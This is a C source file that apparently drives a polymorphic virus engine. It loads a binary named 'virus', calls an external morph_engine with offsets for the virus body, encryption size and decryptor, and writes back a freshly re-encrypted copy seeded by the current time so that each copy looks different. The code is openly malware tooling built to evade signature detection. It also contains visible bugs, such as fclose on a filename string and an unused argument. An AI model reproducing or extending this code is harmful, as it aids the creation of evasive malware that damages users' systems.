
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <time.h>

extern  int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
int main(int argc, char* argv[])
{



	// seeding rand with current time for unique encryption
	srand(time(NULL));

	// get the arguments
	const char* virus_name = argv[1];
	const size_t virus_instruction_begin  = strtoull(argv[2], NULL, 16);
	const size_t virus_encrypt_size    = strtoull(argv[3], NULL, 16);
	const size_t virus_decrypt_offset  = strtoull(argv[4], NULL, 16);




	// virus name
	char filename[] = "virus";

	FILE *f = fopen(filename, "rb");
	fseek(f, 0, SEEK_END);
	long fsize = ftell(f);
	fseek(f, 0, SEEK_SET);  /* same as rewind(f); */

	char *string = malloc(fsize + 1);
	if(!string)
	{
			fclose(filename);
			printf("Executable data allocation failed\n");
			return 1;
	}
	fread(string, 1, fsize, f);
	fclose(f);



	// call the polymorphic engine
	if(morph_engine(string, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
	{
		printf("An error occured in the polymorphic engine\n");

	}

	remove(filename);


	FILE* out_file = fopen("virus", "wb");
	// write the modified executable data
	fwrite(string, fsize, 1, out_file);
	fclose(out_file);


	free(string);


















	// // open the executable file
	// FILE* virus_file = fopen(virus_name, "rb");
	// if(!virus_file)
	// {
	// 	cout << "Error opening " <<  virus_name << endl;
	// 	return 1;
	// }

	// // get the size of the executable file
	// size_t virus_size;
	// fseek(virus_file, 0, SEEK_END);
	// virus_size = ftell(virus_file);
	// rewind(virus_file);


    // char* virus_data = new char[virus_size];
    // fread(virus_data, virus_size, 1, virus_file);
    // if(morph_engine(virus_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
	// {
	// 	cout << "Encoutered errors in the morph engine" << endl;

	// }


    // std::ofstream outfile ("virus_morph",std::ofstream::binary);
    // // write to outfile
    // outfile.write (virus_data,virus_size);



    return 0;
}

// https://stackoverflow.com/questions/22129349/reading-binary-file-to-unsigned-char-array-and-write-it-to-another
// https://stackoverflow.com/questions/43765881/c-reading-binary-files
// http://www.cplusplus.com/forum/beginner/176692/